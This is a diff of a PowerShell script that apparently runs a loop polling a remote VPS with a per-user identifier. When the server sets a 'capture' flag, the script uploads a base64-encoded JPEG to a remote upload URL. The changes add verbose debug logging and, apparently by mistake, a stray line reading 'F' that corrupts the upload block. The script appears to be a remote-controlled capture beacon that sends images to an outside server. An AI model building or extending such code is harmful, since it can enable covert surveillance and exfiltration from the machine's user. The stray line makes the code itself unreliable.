@@ -85,9 +85,26 @@ while ($true) {
   try {
     Log "15 Polling VPS"
 
-    $response = Invoke-RestMethod -Method Get -Uri "$VPS_POLL_URL?username=$uniqueUser" -TimeoutSec 10 -UseBasicParsing
+    $fullUri = "$VPS_POLL_URL?username=$uniqueUser"
+    Log "15a Full URI: $fullUri"
+    Log "15b URI length: $($fullUri.Length)"
+    Log "15c VPS_POLL_URL: $VPS_POLL_URL"
+    Log "15d uniqueUser: $uniqueUser"
+
+    $response = Invoke-RestMethod -Method Get -Uri $fullUri -TimeoutSec 10 -UseBasicParsing
 
     Log "16 Poll successful"
+    Log "16a Response type: $($response.GetType().Name)"
+    Log "16b Response content: $response"
+
+    if ($response) {
+      Log "16c Response exists"
+      if ($response -is [string]) {
+        Log "16d Response is string, converting to JSON"
+        $response = $response | ConvertFrom-Json
+      }
+      Log "16e Response capture value: $($response.capture)"
+    }
 
     if ($response -and $response.capture -eq $true) {
       Log "17 Capture requested"
@@ -141,7 +158,7 @@ while ($true) {
           filename = (Get-Item $JpegPath).Name
           image = $base64Image
         } | ConvertTo-Json -Compress
-
+F
         Log "28 Uploading JPEG"
 
         Invoke-RestMethod -Method Post -Uri $VPS_UPLOAD_URL -ContentType "application/json" -Body $body -TimeoutSec 10 -UseBasicParsing | Out-Null
@@ -161,7 +178,9 @@ while ($true) {
     }
   }
   catch {
-    Log "ERROR: $($_.Exception.Message)"
+    Log "ERROR at line $($_.InvocationInfo.ScriptLineNumber): $($_.Exception.Message)"
+    Log "ERROR TYPE: $($_.Exception.GetType().FullName)"
+    Log "ERROR URI attempt: $fullUri"
     Log "ERROR DETAILS: $($_.Exception.ToString())"
   }
 
